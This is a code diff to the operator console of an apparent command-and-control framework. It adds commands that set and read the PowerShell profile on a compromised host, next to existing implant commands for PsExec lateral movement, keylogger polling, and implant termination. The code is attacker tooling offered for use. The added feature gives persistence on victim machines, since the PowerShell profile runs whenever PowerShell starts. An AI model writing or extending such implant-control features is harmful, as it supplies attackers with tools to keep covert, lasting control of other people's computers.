@@ -106,6 +106,23 @@ export const Console = ({ implantId }: ConsoleProps) => {
             terminal.writeln('  lateral <tgt> <svc> <bin> - PsExec via service');
             terminal.writeln('  keylog           - Poll keylogger');
             terminal.writeln('  kill             - Terminate implant');
+            terminal.writeln('  setprofile <script> - Set PowerShell profile');
+            terminal.writeln('  getprofile       - Get PowerShell profile');
+          } else if (trimmed.startsWith('setprofile ')) {
+            const script = trimmed.substring(11);
+            try {
+              await invoke('set_powershell_profile', { implantId, profileScript: script });
+              terminal.writeln(`\x1b[32mProfile updated\x1b[0m`);
+            } catch (e) {
+              terminal.writeln(`\x1b[31mError:\x1b[0m ${e}`);
+            }
+          } else if (trimmed === 'getprofile') {
+            try {
+              const script = await invoke('get_powershell_profile', { implantId });
+              terminal.writeln(`\x1b[32mCurrent Profile:\x1b[0m\r\n${script}`);
+            } catch (e) {
+              terminal.writeln(`\x1b[31mError:\x1b[0m ${e}`);
+            }
           } else if (trimmed === 'clear') {
             terminal.clear();
           } else {
